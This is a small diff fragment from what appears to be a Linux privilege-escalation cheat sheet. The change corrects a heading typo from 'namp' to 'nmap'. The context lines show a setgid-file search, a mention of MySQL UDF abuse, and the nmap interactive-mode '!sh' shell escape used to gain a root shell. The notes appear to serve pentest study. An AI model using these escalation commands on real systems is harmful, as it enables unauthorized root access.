@@ -27,7 +27,7 @@ For MySQL, if there is mysql daemon running as root, you could utilize UDF (User
 	$ find / -perm -2000 2>/dev/null
 
 
-### namp 
+### nmap 
 
 	$ nmap --interactive
 	nmap> !sh
